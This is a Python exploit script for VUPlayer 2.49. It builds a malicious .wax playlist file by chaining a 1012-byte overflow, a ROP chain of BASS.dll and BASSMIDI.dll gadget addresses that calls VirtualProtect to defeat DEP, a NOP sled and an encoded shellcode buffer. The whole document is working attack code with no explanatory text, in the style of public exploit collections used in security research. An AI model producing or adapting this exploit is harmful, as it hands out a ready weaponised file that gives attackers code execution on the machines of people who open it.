#!/usr/bin/env python

print "`````````````````````````````````````````````````````````````````````"
print "`   Exploit By     : 0xAnnLynn                                      `"
print "`   Exploit Title  : Vuplayer 2.49 exploit                          `"
print "`   Exploit Date   : 02.11.2020                                     `"
print "`   Practice       : Unknown                                        `"
print "`   GitHub         : https://github.com/TamilHackz/i-make-exploits  `"
print "`                                                                   `"
print "`````````````````````````````````````````````````````````````````````"


import struct

#SHELL CODE
buf =  b""
buf += b"\xd9\xc2\xd9\x74\x24\xf4\x58\xba\xaa\xfc\xf2\x35\x2b"
buf += b"\xc9\xb1\x31\x31\x50\x18\x83\xc0\x04\x03\x50\xbe\x1e"
buf += b"\x07\xc9\x56\x5c\xe8\x32\xa6\x01\x60\xd7\x97\x01\x16"
buf += b"\x93\x87\xb1\x5c\xf1\x2b\x39\x30\xe2\xb8\x4f\x9d\x05"
buf += b"\x09\xe5\xfb\x28\x8a\x56\x3f\x2a\x08\xa5\x6c\x8c\x31"
buf += b"\x66\x61\xcd\x76\x9b\x88\x9f\x2f\xd7\x3f\x30\x44\xad"
buf += b"\x83\xbb\x16\x23\x84\x58\xee\x42\xa5\xce\x65\x1d\x65"
buf += b"\xf0\xaa\x15\x2c\xea\xaf\x10\xe6\x81\x1b\xee\xf9\x43"
buf += b"\x52\x0f\x55\xaa\x5b\xe2\xa7\xea\x5b\x1d\xd2\x02\x98"
buf += b"\xa0\xe5\xd0\xe3\x7e\x63\xc3\x43\xf4\xd3\x2f\x72\xd9"
buf += b"\x82\xa4\x78\x96\xc1\xe3\x9c\x29\x05\x98\x98\xa2\xa8"
buf += b"\x4f\x29\xf0\x8e\x4b\x72\xa2\xaf\xca\xde\x05\xcf\x0d"
buf += b"\x81\xfa\x75\x45\x2f\xee\x07\x04\x25\xf1\x9a\x32\x0b"
buf += b"\xf1\xa4\x3c\x3b\x9a\x95\xb7\xd4\xdd\x29\x12\x91\x12"
buf += b"\x60\x3f\xb3\xba\x2d\xd5\x86\xa6\xcd\x03\xc4\xde\x4d"
buf += b"\xa6\xb4\x24\x4d\xc3\xb1\x61\xc9\x3f\xcb\xfa\xbc\x3f"
buf += b"\x78\xfa\x94\x23\x1f\x68\x74\x8a\xba\x08\x1f\xd2"


def create_rop_chain():

    rop_gadgets = [
      0x10015f77,  # POP EAX # RETN [BASS.dll] 
      0x1060e25c,  # ptr to &VirtualProtect() [IAT BASSMIDI.dll]
      0x1001eaf1,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [BASS.dll] 
      0x10030950,  # XCHG EAX,ESI # RETN [BASS.dll] 
      0x1001d748,  # POP EBP # RETN [BASS.dll] 
      0x100222c5,  # & jmp esp [BASS.dll]
      0x10015fe7,  # POP EAX # RETN [BASS.dll] 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x10014db4,  # NEG EAX # RETN [BASS.dll] 
      0x10032f32,  # XCHG EAX,EBX # RETN 0x00 [BASS.dll] 
      0x10015f77,  # POP EAX # RETN [BASS.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x10014db4,  # NEG EAX # RETN [BASS.dll] 
      0x10038a6d,  # XCHG EAX,EDX # RETN [BASS.dll] 
      0x100163c7,  # POP ECX # RETN [BASS.dll] 
      0x1060da06,  # &Writable location [BASSMIDI.dll]
      0x10603658,  # POP EDI # RETN [BASSMIDI.dll] 
      0x1001dc05,  # RETN (ROP NOP) [BASS.dll]
      0x10015fe7,  # POP EAX # RETN [BASS.dll] 
      0x90909090,  # nop
      0x1001d7a5,  # PUSHAD # RETN [BASS.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
rop_chain = create_rop_chain()
nop = '\x90'*16
buffer = "A"*1012 + rop_chain + nop + buf
payload = buffer

f = open("payload.wax","w")

f.write(payload)
f.close()
